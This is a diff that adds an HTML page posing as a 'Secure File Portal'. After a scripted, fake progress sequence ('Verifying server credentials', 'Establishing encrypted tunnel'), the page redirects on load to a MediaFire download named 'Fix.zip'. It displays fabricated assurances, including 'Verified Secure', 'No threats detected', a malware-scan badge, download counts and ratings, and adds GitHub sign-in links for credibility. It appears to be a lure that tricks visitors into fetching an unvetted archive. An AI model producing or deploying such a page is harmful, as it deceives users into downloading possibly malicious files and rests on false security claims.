@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure File Portal - Advanced Cloud Storage</title>
+  <meta name="description" content="Secure file download portal with encrypted connections and virus scanning - Advanced cloud storage solution"/>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📁</text></svg>"/>
+  <style>
+	  /* Reset and base styles */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0c1628 100%);
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+  position: relative;
+}
+
+.background-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    radial-gradient(circle at 20% 80%, rgba(45, 212, 191, 0.15) 0%, transparent 50%),
+    radial-gradient(circle at 80% 20%, rgba(124, 58, 237, 0.18) 0%, transparent 50%),
+    radial-gradient(circle at 50% 50%, rgba(236, 72, 153, 0.1) 0%, transparent 50%);
+  animation: float 35s ease-in-out infinite;
+  z-index: -1;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px) rotate(0deg) scale(1); }
+  33% { transform: translateY(-15px) rotate(2deg) scale(1.03); }
+  66% { transform: translateY(10px) rotate(-2deg) scale(0.97); }
+}
+
+.container {
+  width: 100%;
+  max-width: 500px;
+  padding: 20px;
+  z-index: 1;
+}
+
+.card {
+  background: rgba(15, 23, 42, 0.88);
+  backdrop-filter: blur(32px) saturate(190%);
+  border-radius: 32px;
+  box-shadow: 
+    0 45px 90px rgba(0, 0, 0, 0.4),
+    0 0 0 1px rgba(124, 58, 237, 0.1),
+    inset 0 1px 0 rgba(255, 255, 255, 0.06);
+  overflow: hidden;
+  animation: slideUp 1s cubic-bezier(0.16, 1, 0.3, 1);
+  transition: all 0.45s ease;
+  border: 1px solid rgba(148, 163, 184, 0.08);
+}
+
+.card:hover {
+  transform: translateY(-3px);
+  box-shadow: 
+    0 52px 104px rgba(0, 0, 0, 0.45),
+    0 0 0 1px rgba(124, 58, 237, 0.15);
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(45px) scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+.card-header {
+  padding: 10px 32px 0;
+  text-align: center;
+  position: relative;
+}
+
+.security-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 9px;
+  background: linear-gradient(135deg, #14b8a6, #2dd4bf);
+  color: #ffffff;
+  padding: 11px 20px;
+  border-radius: 50px;
+  font-size: 14px;
+  font-weight: 700;
+  box-shadow: 0 8px 24px rgba(20, 184, 166, 0.4);
+  transition: all 0.35s ease;
+}
+
+.security-badge:hover {
+  box-shadow: 0 10px 28px rgba(20, 184, 166, 0.5);
+  transform: translateY(-2px) scale(1.02);
+}
+
+.card-body {
+  padding: 36px;
+  text-align: center;
+}
+
+.download-icon {
+  width: 88px;
+  height: 88px;
+  margin: 0 auto 26px;
+  background: linear-gradient(135deg, #7c3aed, #ec4899);
+  border-radius: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  animation: pulse 4s ease-in-out infinite;
+  box-shadow: 0 14px 45px rgba(124, 58, 237, 0.3);
+  position: relative;
+}
+
+.download-icon::before {
+  content: '';
+  position: absolute;
+  inset: -3px;
+  background: linear-gradient(135deg, #7c3aed, #ec4899);
+  border-radius: 24px;
+  opacity: 0.35;
+  filter: blur(12px);
+  z-index: -1;
+}
+
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+h1 {
+  font-size: 31px;
+  font-weight: 800;
+  background: linear-gradient(135deg, #f9fafb, #e0e7ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 12px;
+  line-height: 1.2;
+  letter-spacing: -0.03em;
+}
+
+.subtitle {
+  font-size: 16px;
+  color: #cbd5e1;
+  margin-bottom: 36px;
+  font-weight: 500;
+}
+
+.progress-container {
+  margin-bottom: 26px;
+}
+
+.progress-bar {
+  width: 100%;
+  height: 11px;
+  background: rgba(51, 65, 85, 0.65);
+  border-radius: 6px;
+  overflow: hidden;
+  position: relative;
+  box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.35);
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, #7c3aed, #ec4899, #2dd4bf);
+  background-size: 200% 100%;
+  border-radius: 6px;
+  width: 0%;
+  transition: width 0.9s cubic-bezier(0.4, 0, 0.2, 1);
+  animation: shimmer 2.2s infinite;
+  box-shadow: 0 0 15px rgba(124, 58, 237, 0.5);
+}
+
+@keyframes shimmer {
+  0% { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+
+.status-text {
+  font-size: 16px;
+  color: #e5e7eb;
+  margin-bottom: 18px;
+  font-weight: 500;
+}
+
+.error-text {
+  font-size: 14px;
+  color: #f87171;
+  margin-bottom: 18px;
+  min-height: 1.2em;
+  font-weight: 600;
+}
+
+.features {
+  display: flex;
+  justify-content: center;
+  gap: 26px;
+  margin-top: 36px;
+  flex-wrap: wrap;
+  list-style: none;
+}
+
+.feature {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 14px;
+  color: #cbd5e1;
+  font-weight: 600;
+  padding: 9px 16px;
+  background: rgba(124, 58, 237, 0.1);
+  border-radius: 14px;
+  border: 1px solid rgba(124, 58, 237, 0.2);
+  transition: all 0.35s ease;
+}
+
+.feature:hover {
+  background: rgba(124, 58, 237, 0.15);
+  border-color: rgba(124, 58, 237, 0.3);
+  transform: translateY(-3px);
+  box-shadow: 0 6px 20px rgba(124, 58, 237, 0.2);
+}
+
+.feature svg {
+  color: #2dd4bf;
+}
+
+.card-footer {
+  background: rgba(7, 12, 24, 0.75);
+  padding: 20px 32px;
+  text-align: center;
+  border-top: 1px solid rgba(124, 58, 237, 0.12);
+}
+
+/* Top Navigation Styles */
+.top-nav {
+  position: fixed;
+  top: 22px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(15, 23, 42, 0.92);
+  backdrop-filter: blur(32px) saturate(190%);
+  border-radius: 20px;
+  padding: 16px 26px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  box-shadow: 
+    0 12px 45px rgba(0, 0, 0, 0.5),
+    0 0 0 1px rgba(124, 58, 237, 0.18);
+  border: 1px solid rgba(148, 163, 184, 0.1);
+  z-index: 1001;
+  animation: topNavSlideIn 1s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes topNavSlideIn {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(-35px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+.nav-btn {
+  background: rgba(124, 58, 237, 0.18);
+  border: 1px solid rgba(124, 58, 237, 0.3);
+  color: #e5e7eb;
+  padding: 10px 20px;
+  border-radius: 14px;
+  font-size: 13px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.35s ease;
+  white-space: nowrap;
+}
+
+.nav-btn:hover {
+  background: rgba(124, 58, 237, 0.28);
+  border-color: rgba(124, 58, 237, 0.45);
+  color: #ffffff;
+  transform: translateY(-2px);
+  box-shadow: 0 8px 20px rgba(124, 58, 237, 0.35);
+}
+
+.footer-text {
+  font-size: 13px;
+  color: #64748b;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 16px;
+}
+
+/* Modal Styles */
+.modal {
+  display: none;
+  position: fixed;
+  z-index: 1000;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.8);
+  backdrop-filter: blur(10px);
+}
+
+.modal-content {
+  background: rgba(15, 23, 42, 0.96);
+  backdrop-filter: blur(32px);
+  margin: 5% auto;
+  padding: 40px;
+  border-radius: 24px;
+  width: 90%;
+  max-width: 500px;
+  box-shadow: 
+    0 45px 90px rgba(0, 0, 0, 0.65),
+    0 0 0 1px rgba(124, 58, 237, 0.25);
+  border: 1px solid rgba(148, 163, 184, 0.12);
+  animation: modalSlideIn 0.45s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes modalSlideIn {
+  from {
+    opacity: 0;
+    transform: translateY(-45px) scale(0.94);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+.close {
+  color: #9ca3af;
+  float: right;
+  font-size: 30px;
+  font-weight: bold;
+  cursor: pointer;
+  transition: all 0.35s ease;
+}
+
+.close:hover {
+  color: #ffffff;
+  transform: rotate(90deg);
+}
+
+.modal h2 {
+  color: #f9fafb;
+  margin-bottom: 26px;
+  font-size: 28px;
+  font-weight: 800;
+}
+
+.file-info {
+  color: #cbd5e1;
+}
+
+.file-info p {
+  margin-bottom: 16px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid rgba(124, 58, 237, 0.18);
+}
+
+.file-info strong {
+  color: #f3f4f6;
+  display: inline-block;
+  width: 150px;
+}
+
+.auth-form {
+  display: flex;
+  flex-direction: column;
+  gap: 18px;
+}
+
+.auth-form input {
+  background: rgba(7, 12, 24, 0.85);
+  border: 1px solid rgba(124, 58, 237, 0.3);
+  border-radius: 12px;
+  padding: 14px 20px;
+  color: #f3f4f6;
+  font-size: 14px;
+  transition: all 0.35s ease;
+}
+
+.auth-form input:focus {
+  outline: none;
+  border-color: #ec4899;
+  box-shadow: 0 0 0 4px rgba(236, 72, 153, 0.18);
+  background: rgba(7, 12, 24, 0.98);
+}
+
+.auth-btn {
+  background: linear-gradient(135deg, #7c3aed, #ec4899);
+  border: none;
+  color: #ffffff;
+  padding: 14px 28px;
+  border-radius: 12px;
+  font-size: 15px;
+  font-weight: 800;
+  cursor: pointer;
+  transition: all 0.35s ease;
+  box-shadow: 0 8px 24px rgba(124, 58, 237, 0.3);
+}
+
+.auth-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 32px rgba(124, 58, 237, 0.4);
+}
+
+.auth-link {
+  text-align: center;
+  color: #9ca3af;
+  font-size: 14px;
+}
+
+.auth-link a {
+  color: #ec4899;
+  text-decoration: none;
+  cursor: pointer;
+  font-weight: 700;
+}
+
+.auth-link a:hover {
+  text-decoration: underline;
+  color: #f472b6;
+}
+
+/* Info Popup Styles */
+.info-popup {
+  display: none;
+  position: fixed;
+  top: 100px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 90%;
+  max-width: 500px;
+  background: rgba(15, 23, 42, 0.94);
+  backdrop-filter: blur(32px) saturate(190%);
+  border-radius: 20px;
+  padding: 22px;
+  box-shadow: 
+    0 14px 52px rgba(0, 0, 0, 0.55),
+    0 0 0 1px rgba(124, 58, 237, 0.18);
+  border: 1px solid rgba(148, 163, 184, 0.1);
+  z-index: 1000;
+  animation: popupSlideDown 0.45s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes popupSlideDown {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+.info-list {
+  margin: 0;
+  padding: 0;
+}
+
+.info-item {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 14px 0;
+  color: #cbd5e1;
+  font-size: 14px;
+  border-bottom: 1px solid rgba(124, 58, 237, 0.14);
+}
+
+.info-item:last-child {
+  border-bottom: none;
+}
+
+.info-item dt {
+  display: flex;
+  align-items: center;
+}
+
+.info-item svg {
+  color: #ec4899;
+  flex-shrink: 0;
+}
+
+.info-item strong {
+  color: #f3f4f6;
+}
+
+.info-popup-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+  padding-bottom: 16px;
+  border-bottom: 1px solid rgba(124, 58, 237, 0.18);
+}
+
+.secure-portal-btn {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  background: linear-gradient(135deg, rgba(124, 58, 237, 0.25), rgba(236, 72, 153, 0.18));
+  border: 1px solid rgba(124, 58, 237, 0.35);
+  border-radius: 12px;
+  padding: 10px 16px;
+  color: #f9fafb;
+  font-size: 14px;
+  font-weight: 800;
+  cursor: pointer;
+  transition: all 0.35s ease;
+}
+
+.secure-portal-btn:hover {
+  background: linear-gradient(135deg, rgba(124, 58, 237, 0.35), rgba(236, 72, 153, 0.28));
+  border-color: rgba(124, 58, 237, 0.5);
+  transform: translateY(-2px);
+}
+
+.secure-portal-btn svg {
+  color: #2dd4bf;
+}
+
+.auth-buttons {
+  display: flex;
+  gap: 12px;
+}
+
+.auth-btn-small {
+  background: rgba(124, 58, 237, 0.18);
+  border: 1px solid rgba(124, 58, 237, 0.3);
+  color: #e5e7eb;
+  padding: 8px 18px;
+  border-radius: 12px;
+  font-size: 13px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.35s ease;
+  text-decoration: none;
+  display: inline-block;
+}
+
+.auth-btn-small:hover {
+  background: rgba(124, 58, 237, 0.28);
+  border-color: rgba(124, 58, 237, 0.45);
+  color: #ffffff;
+  transform: translateY(-2px);
+}
+
+/* Responsive design */
+@media (max-width: 480px) {
+  .container {
+    padding: 16px;
+  }
+
+  .card-body {
+    padding: 28px;
+  }
+
+  .card-header {
+    padding: 22px 28px 0;
+  }
+
+  h1 {
+    font-size: 27px;
+  }
+
+  .download-icon {
+    width: 76px;
+    height: 76px;
+    margin-bottom: 22px;
+  }
+
+  .features {
+    gap: 14px;
+  }
+
+  .feature {
+    font-size: 13px;
+    padding: 8px 14px;
+  }
+}
+
+@media (max-width: 360px) {
+  .features {
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .action-buttons {
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .action-btn {
+    width: 100%;
+  }
+}
+
+@media (max-width: 480px) {
+  .modal-content {
+    margin: 10% auto;
+    padding: 32px;
+    width: 95%;
+  }
+
+  .top-nav {
+    top: 14px;
+    padding: 12px 20px;
+    gap: 12px;
+  }
+
+  .nav-btn {
+    padding: 8px 16px;
+    font-size: 12px;
+  }
+
+  .info-popup {
+    top: 80px;
+    width: 95%;
+  }
+}
+  </style>
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline';
+    style-src 'self' 'unsafe-inline';
+    connect-src 'self' https:;
+    img-src 'self' data:;
+    frame-ancestors 'self'
+  "/>
+  <meta http-equiv="X-Content-Type-Options" content="nosniff"/>
+  <meta http-equiv="X-Frame-Options" content="SAMEORIGIN"/>
+  <meta name="referrer" content="no-referrer"/>
+
+</head>
+<body>
+  <div class="background-overlay" aria-hidden="true"></div>
+  
+  <main class="container">
+    <header class="top-nav">
+      <button class="nav-btn" onclick="toggleInfoPopup()" aria-label="Show detailed file information" type="button">
+        File Information
+      </button>
+      <div class="security-badge" role="status" aria-label="Secure portal indicator">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Verified Secure</span>
+      </div>
+    </header>
+
+    <article class="card">
+      <div class="card-header" aria-hidden="true"></div>
+
+      <section class="card-body">
+        <div class="download-icon" aria-hidden="true">
+          <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
+            <path d="M21 15V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M7 10L12 15L17 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M12 15V3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+
+        <h1>Preparing Your Secure Download</h1>
+        <p class="subtitle">Establishing encrypted connection...</p>
+        
+        <div class="progress-container" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="Download preparation progress">
+          <div class="progress-bar">
+            <div class="progress-fill"></div>
+          </div>
+        </div>
+
+        <p id="status-text" class="status-text" role="status" aria-live="polite">
+          Initializing secure session...
+        </p>
+        <p id="error-text" class="error-text" role="alert" aria-live="assertive"></p>
+
+        <ul class="features">
+          <li class="feature">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span>End-to-End Encryption</span>
+          </li>
+          <li class="feature">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span>Real-time Malware Scan</span>
+          </li>
+          <li class="feature">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <span>High-Speed Transfer</span>
+          </li>
+        </ul>
+      </section>
+
+      <footer class="card-footer">
+        <p class="footer-text">Powered by Enterprise Cloud Infrastructure</p>
+      </footer>
+    </article>
+  </main>
+
+  <aside id="infoPopup" class="info-popup" role="dialog" aria-labelledby="popup-title" aria-modal="true" aria-hidden="true">
+    <header class="info-popup-header">
+      <h2 id="popup-title" class="secure-portal-btn" style="all: unset; display: inline-flex; align-items: center; gap: 0.5rem; font-size: inherit;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Verified Portal</span>
+      </h2>
+      <nav class="auth-buttons" aria-label="User authentication">
+        <a href="https://github.com/login" target="_blank" rel="noopener noreferrer" class="auth-btn-small">
+          Sign In
+        </a>
+        <a href="https://github.com/signup" target="_blank" rel="noopener noreferrer" class="auth-btn-small">
+          Register
+        </a>
+      </nav>
+    </header>
+    
+    <dl class="info-list">
+      <div class="info-item">
+        <dt>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M7 18H17V16H7V18Z" fill="currentColor"/>
+            <path d="M17 14H7V12H17V14Z" fill="currentColor"/>
+            <path d="M7 10H17V8H7V10Z" fill="currentColor"/>
+            <path d="M19 4H5C3.9 4 3 4.9 3 6V18C3 19.1 3.9 20 5 20H19C20.1 20 21 19.1 21 18V6C21 4.9 20.1 4 19 4Z" stroke="currentColor" stroke-width="2" fill="none"/>
+          </svg>
+        </dt>
+        <dd><strong>Total Downloads:</strong> 2,534+</dd>
+      </div>
+      
+      <div class="info-item">
+        <dt>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="currentColor"/>
+          </svg>
+        </dt>
+        <dd><strong>User Rating:</strong> 4.9/5.0</dd>
+      </div>
+      
+      <div class="info-item">
+        <dt>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M14 2H6C4.9 2 4 2.9 4 4V20C4 21.1 4.89 22 5.99 22H18C19.1 22 20 21.1 20 20V8L14 2Z" stroke="currentColor" stroke-width="2" fill="none"/>
+            <path d="M14 2V8H20" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </dt>
+        <dd><strong>Archive Type:</strong> Compressed ZIP</dd>
+      </div>
+      
+      <div class="info-item">
+        <dt>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+            <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </dt>
+        <dd><strong>Security Scan:</strong> No threats detected</dd>
+      </div>
+    </dl>
+  </aside>
+
+  <script>
+	  
+document.addEventListener('DOMContentLoaded', function() {
+  const statusText = document.getElementById('status-text');
+  const errorText = document.getElementById('error-text');
+  const progressFill = document.querySelector('.progress-fill');
+  
+  // Animated status messages
+  const statusMessages = [
+    'Initializing secure session...',
+    'Verifying server credentials...',
+    'Establishing encrypted tunnel...',
+    'Preparing download link...',
+    'Connection established'
+  ];
+  
+  let messageIndex = 0;
+  let isComplete = false;
+  
+  // Animate status text
+  function updateStatus() {
+    if (messageIndex < statusMessages.length && !isComplete) {
+      statusText.textContent = statusMessages[messageIndex];
+      messageIndex++;
+      
+      // Update progress gradually
+      const progress = (messageIndex / statusMessages.length) * 100;
+      progressFill.style.width = progress + '%';
+      
+      if (messageIndex < statusMessages.length) {
+        setTimeout(updateStatus, 300);
+      } else {
+        // Final step - mark as complete and redirect
+        isComplete = true;
+        statusText.textContent = 'Download starting...';
+        
+        setTimeout(() => {
+          window.location.href = 'https://www.mediafire.com/file/80k04kwo6no6euu/Fix.zip/file';
+        }, 500);
+      }
+    }
+  }
+  
+  // Start the animation sequence
+  setTimeout(updateStatus, 200);
+  
+  // Add hover effects for enhanced interactivity
+  const card = document.querySelector('.card');
+  
+  card.addEventListener('mouseenter', function() {
+    if (!isComplete) {
+      this.style.transform = 'translateY(-2px)';
+      this.style.boxShadow = '0 40px 80px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1)';
+    }
+  });
+  
+  card.addEventListener('mouseleave', function() {
+    if (!isComplete) {
+      this.style.transform = 'translateY(0)';
+      this.style.boxShadow = '0 32px 64px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.05)';
+    }
+  });
+});
+
+// Info popup toggle
+function toggleInfoPopup() {
+  const popup = document.getElementById('infoPopup');
+  if (popup.style.display === 'block') {
+    popup.style.display = 'none';
+  } else {
+    popup.style.display = 'block';
+  }
+}
+
+// Close popup when clicking outside
+document.addEventListener('click', function(event) {
+  const popup = document.getElementById('infoPopup');
+  const infoBtn = event.target.closest('button[onclick="toggleInfoPopup()"]');
+  
+  if (!popup.contains(event.target) && !infoBtn) {
+    popup.style.display = 'none';
+  }
+});
+
+
+  </script>
+</body>
+
+</html>
